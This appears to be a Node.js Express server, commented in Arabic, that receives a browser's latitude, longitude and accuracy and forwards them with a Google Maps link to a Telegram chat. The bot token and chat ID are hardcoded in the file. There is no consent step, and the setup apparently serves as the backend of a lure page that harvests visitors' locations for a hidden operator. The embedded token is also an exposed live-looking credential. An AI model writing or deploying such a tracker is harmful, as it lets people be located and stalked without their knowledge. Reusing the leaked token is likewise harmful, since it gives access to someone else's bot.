const express = require("express");
const path = require("path");
const fetch = require("node-fetch");

const app = express();
app.use(express.json());

const PORT = process.env.PORT || 3000;

// 🔴 إدخال مباشر (غير آمن لو الكود عام)
const TELEGRAM_TOKEN = "7867382864:AAHeEvpiotKr4BQMAY_YbrCVl-rloJI-MqQ";
const TELEGRAM_CHAT_ID = "6837315281";

// تقديم الملفات الثابتة
app.use(express.static(__dirname));

// استقبال الموقع من المتصفح وإرساله إلى تيليجرام
app.post("/send-location", async (req, res) => {
  const { lat, lng, accuracy } = req.body;
  if (!lat || !lng) {
    return res.status(400).json({ error: "Missing coordinates" });
  }

  const text = `📍 موقع جديد:
https://maps.google.com/?q=${lat},${lng}
خط العرض: ${lat}
خط الطول: ${lng}
الدقة: ${accuracy || "?"}m`;

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text
      }),
    });

    res.json({ ok: true });
  } catch (err) {
    console.error("فشل الإرسال إلى تيليجرام:", err.message);
    res.status(500).json({ error: "Telegram send failed" });
  }
});

// الصفحة الرئيسية
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.listen(PORT, () => {
  console.log(`✅ Server is running on port ${PORT}`);
});
